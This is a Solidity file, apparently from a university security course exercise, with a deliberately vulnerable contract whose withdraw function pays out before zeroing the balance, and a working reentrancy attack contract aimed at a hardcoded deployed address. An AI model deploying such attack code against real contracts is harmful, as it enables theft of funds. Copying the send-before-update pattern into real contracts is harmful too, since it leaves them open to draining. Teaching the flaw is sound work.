/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;//vulnerability lies here
    }
}

contract Attack {

    Vuln a = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));

    function hack() public payable { 

        a.deposit.value(msg.value)();
        a.withdraw();
        
    }

    fallback() external payable{
        if(address(this).balance <= 300 finney){
            a.withdraw();
            
        }
    }

}